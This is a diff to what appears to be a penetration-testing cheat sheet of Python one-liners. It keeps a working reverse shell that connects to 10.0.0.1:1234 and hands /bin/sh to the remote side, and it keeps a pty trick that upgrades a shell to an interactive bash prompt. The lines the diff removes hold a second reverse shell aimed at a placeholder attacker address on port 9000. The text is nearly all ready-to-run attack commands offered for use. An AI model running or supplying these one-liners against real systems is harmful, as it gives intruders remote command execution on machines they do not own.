@@ -11,10 +11,6 @@ python -m SimpleHTTPServer 8000```
 ```python 
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'```
 
-**Reverse Shell to YOURIP on port 9000**
-```python
-python -c "import socket,subprocess,os;host=\"[YOURIP]\";port=9000;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((host,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"```
-
 **Spawn bash shell prompt**
 ```python
 python -c 'import pty; pty.spawn("/bin/bash")'```
